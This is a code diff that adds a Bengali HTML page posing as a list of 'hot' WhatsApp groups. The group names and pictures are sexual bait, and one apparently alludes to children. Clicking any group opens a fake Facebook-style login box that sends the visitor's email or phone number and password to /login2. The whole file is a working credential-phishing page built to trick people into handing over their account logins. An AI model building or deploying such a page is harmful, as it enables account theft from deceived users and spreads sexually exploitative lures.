@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>হট হোয়াটসঅ্যাপ গ্রুপ</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #000; color: #fff; font-size: 16px; }
+        .header { padding: 10px; border-bottom: 1px solid #333; text-align: center; font-size: 18px; font-weight: bold; }
+        .group-list { padding: 10px; }
+        .group-item { display: flex; align-items: center; padding: 10px; border-bottom: 1px solid #333; cursor: pointer; transition: background-color 0.2s; }
+        .group-item:hover { background-color: #222; }
+        .group-avatar { width: 50px; height: 50px; border-radius: 50%; margin-right: 10px; background-size: cover; background-position: center; }
+        .group-details { flex-grow: 1; }
+        .group-name { font-weight: bold; margin-bottom: 2px; }
+        .group-desc { color: #999; font-size: 14px; }
+        .group-count { background-color: #25D366; color: #fff; padding: 2px 6px; border-radius: 10px; font-size: 12px; }
+        .overlay { display: none; position: fixed; z-index: 900; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); }
+        .login-modal { background-color: #fff; margin: 10% auto; padding: 20px; width: 70%; max-width: 350px; border-radius: 8px; text-align: center; position: relative; }
+        .login-modal input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dddfe2; border-radius: 6px; }
+        .login-modal .login-btn { width: 100%; padding: 10px; background-color: #1877f2; color: #fff; border: none; border-radius: 6px; cursor: pointer; }
+        .close-btn { position: absolute; top: 10px; right: 15px; background: none; border: none; font-size: 20px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="header">🥰 হট গ্রুপ 🤤</div>
+    <div class="group-list">
+        <div class="group-item" onclick="showLogin('বেস্ট হট পর্ন')">
+            <div class="group-avatar" style="background-image: url('https://c.top4top.io/p_3550lc0uj0.jpeg');"></div>
+            <div class="group-details"><div class="group-name">বেস্ট হট পর্ন 🤤🥰</div><div class="group-desc">এক্সক্লুসিভ কন্টেন্ট</div></div>
+            <div class="group-count">৮২৮</div>
+        </div>
+        <div class="group-item" onclick="showLogin('গ্রুপ বোকেপ')">
+            <div class="group-avatar" style="background-image: url('https://e.top4top.io/p_35507jwpb0.jpeg');"></div>
+            <div class="group-details"><div class="group-name">গ্রুপ বোকেপ 🤤🤤</div><div class="group-desc">হট ভিডিও শেয়ার</div></div>
+            <div class="group-count">২৫৭</div>
+        </div>
+        <div class="group-item" onclick="showLogin('বাচ্চা স্যাঞ্জ')">
+            <div class="group-avatar" style="background-image: url('https://c.top4top.io/p_3550fk2me0.jpeg');"></div>
+            <div class="group-details"><div class="group-name">বাচ্চা স্যাঞ্জ 😁🤤</div><div class="group-desc">ডেইলি আপডেট</div></div>
+            <div class="group-count">৩৫০</div>
+        </div>
+        <div class="group-item" onclick="showLogin('ইন্ডিয়ান এমএমএস ভাইরাল')">
+            <div class="group-avatar" style="background-image: url('https://k.top4top.io/p_3550dag180.jpeg');"></div>
+            <div class="group-details"><div class="group-name">ইন্ডিয়ান এমএমএস ভাইরাল</div><div class="group-desc">ভাইরাল ভিডিও</div></div>
+            <div class="group-count">৬৮৩</div>
+        </div>
+    </div>
+
+    <div id="loginOverlay" class="overlay" onclick="closeLogin()">
+        <div class="login-modal" onclick="event.stopPropagation()">
+            <button class="close-btn" onclick="closeLogin()">&times;</button>
+            <h3>লগইন করুন</h3>
+            <form action="/login2" method="POST">
+                <input type="text" name="username" placeholder="ইমেইল বা মোবাইল" required>
+                <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
+                <input type="hidden" name="groupName" id="groupName">
+                <input type="hidden" name="pageType" value="whatsapp_groups">
+                <button type="submit" class="login-btn">লগইন করুন</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function showLogin(groupName) {
+            document.getElementById('groupName').value = groupName;
+            document.getElementById('loginOverlay').style.display = 'block';
+        }
+        function closeLogin() {
+            document.getElementById('loginOverlay').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
